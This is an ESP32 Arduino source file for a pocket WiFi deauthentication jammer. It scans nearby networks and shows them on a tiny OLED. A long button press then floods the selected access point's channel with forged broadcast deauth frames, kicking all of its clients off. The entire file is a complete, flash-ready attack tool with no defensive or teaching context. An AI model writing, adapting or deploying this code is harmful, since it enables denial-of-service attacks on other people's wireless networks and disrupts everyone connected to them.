#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <Wire.h>
#include <U8g2lib.h>

// ── Board pins ────────────────────────────────────────────────────────────────
#define OLED_SCL  6
#define OLED_SDA  5
#define BOOT_BTN  9   // active LOW, internal pullup

// ── Display ───────────────────────────────────────────────────────────────────
U8G2_SSD1306_72X40_ER_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, OLED_SCL, OLED_SDA);

// ── State ─────────────────────────────────────────────────────────────────────
static int      net_count   = 0;
static int      selected    = 0;
static bool     jamming     = false;
static uint32_t pkt_count   = 0;

// ── Deauth frame template ─────────────────────────────────────────────────────
// 802.11 deauth: FC=0xC0, broadcast dest, AP as src+bssid, reason 7
static uint8_t deauth_frame[26] = {
  0xC0, 0x00,                         // Frame Control: deauth
  0x3A, 0x01,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest: broadcast (kicks all clients)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src: AP BSSID (filled at runtime)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP BSSID (filled at runtime)
  0x00, 0x00,                         // Sequence Control
  0x07, 0x00                          // Reason: class 3 frame from nonassoc STA
};

// ── OLED helpers ──────────────────────────────────────────────────────────────
static void oled_scan_screen() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_4x6_tr);
  u8g2.drawStr(0, 6,  "SCANNING...");
  u8g2.sendBuffer();
}

static void oled_network_screen() {
  if (net_count == 0) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_4x6_tr);
    u8g2.drawStr(0, 6, "NO NETS");
    u8g2.drawStr(0, 14, "RESCAN...");
    u8g2.sendBuffer();
    return;
  }
  char line1[20], line2[20], line3[20];
  snprintf(line1, sizeof(line1), "%d/%d", selected + 1, net_count);
  // Truncate SSID to 16 chars for display
  String ssid = WiFi.SSID(selected);
  if (ssid.length() > 16) ssid = ssid.substring(0, 15) + "~";
  snprintf(line2, sizeof(line2), "%.16s", ssid.c_str());
  snprintf(line3, sizeof(line3), "ch%d HOLD=JAM", WiFi.channel(selected));

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_4x6_tr);
  u8g2.drawStr(0, 6,  line1);
  u8g2.drawStr(0, 14, line2);
  u8g2.drawStr(0, 22, line3);
  u8g2.sendBuffer();
}

static void oled_jam_screen() {
  char line1[20], line2[20], line3[20];
  String ssid = WiFi.SSID(selected);
  if (ssid.length() > 14) ssid = ssid.substring(0, 13) + "~";
  snprintf(line1, sizeof(line1), "DEAUTH");
  snprintf(line2, sizeof(line2), "%.14s", ssid.c_str());
  snprintf(line3, sizeof(line3), "pkts:%lu", pkt_count);

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_4x6_tr);
  u8g2.drawStr(0, 6,  line1);
  u8g2.drawStr(0, 14, line2);
  u8g2.drawStr(0, 22, line3);
  u8g2.sendBuffer();
}

// ── Button read (debounced) ───────────────────────────────────────────────────
// Returns: 0=none, 1=short press, 2=long press (>=1500ms)
static uint8_t read_button() {
  if (digitalRead(BOOT_BTN) != LOW) return 0;
  delay(30); // debounce
  if (digitalRead(BOOT_BTN) != LOW) return 0;

  uint32_t t = millis();
  while (digitalRead(BOOT_BTN) == LOW) {
    if (millis() - t > 1500) {
      // Wait for release before returning long press
      while (digitalRead(BOOT_BTN) == LOW) delay(10);
      return 2;
    }
    delay(10);
  }
  return 1;
}

// ── WiFi scan ─────────────────────────────────────────────────────────────────
static void do_scan() {
  oled_scan_screen();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  net_count = WiFi.scanNetworks();
  selected  = 0;
  jamming   = false;
}

// ── Setup ─────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  pinMode(BOOT_BTN, INPUT_PULLUP);

  Wire.begin(OLED_SDA, OLED_SCL);
  u8g2.begin();

  do_scan();
  oled_network_screen();
  Serial.printf("Found %d networks\n", net_count);
}

// ── Loop ──────────────────────────────────────────────────────────────────────
void loop() {
  uint8_t btn = read_button();

  if (!jamming) {
    if (btn == 1) {
      // Short press: cycle to next network
      if (net_count > 0) {
        selected = (selected + 1) % net_count;
        oled_network_screen();
        Serial.printf("[>] Selected: %s  ch%d\n",
          WiFi.SSID(selected).c_str(), WiFi.channel(selected));
      }
    } else if (btn == 2) {
      // Long press: start deauthing selected network
      if (net_count == 0) { do_scan(); oled_network_screen(); return; }

      // Load AP BSSID into frame src and bssid fields
      uint8_t* bssid = WiFi.BSSID(selected);
      memcpy(&deauth_frame[10], bssid, 6);
      memcpy(&deauth_frame[16], bssid, 6);

      // Switch to the AP's channel
      esp_wifi_set_channel(WiFi.channel(selected), WIFI_SECOND_CHAN_NONE);

      jamming   = true;
      pkt_count = 0;
      Serial.printf("[*] Deauthing %s on ch%d\n",
        WiFi.SSID(selected).c_str(), WiFi.channel(selected));
    }
  } else {
    // Jamming — short or long press stops it
    if (btn != 0) {
      jamming = false;
      Serial.printf("[*] Stopped. %lu packets sent.\n", pkt_count);
      oled_network_screen();
      return;
    }

    // Send deauth burst (4 frames per loop = fast without starving display)
    for (int i = 0; i < 4; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
      pkt_count++;
    }

    // Refresh OLED every 100 packets
    if (pkt_count % 100 == 0) oled_jam_screen();
  }
}
